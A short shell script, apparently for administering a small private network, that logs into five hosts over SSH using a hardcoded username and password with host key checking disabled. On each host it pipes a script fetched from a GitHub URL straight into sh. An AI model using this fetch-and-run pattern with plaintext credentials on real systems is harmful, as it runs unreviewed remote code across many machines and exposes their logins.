#!/bin/sh
# Pedro Almeida - pedroalmeida173@gmail.com

port=22

pass=fucker
user=mother

network="172.16.18."
ip=1

while [ $ip -le 5 ]
do
	sshpass -p $pass ssh -p $port -oConnectTimeout=10 -oStrictHostKeyChecking=no $user@$network$ip "trigger_url https://raw.githubusercontent.com/pedrodealmeida/remove_mf/master/removemfv2.sh | sh"&
	(( ip++ ))
done
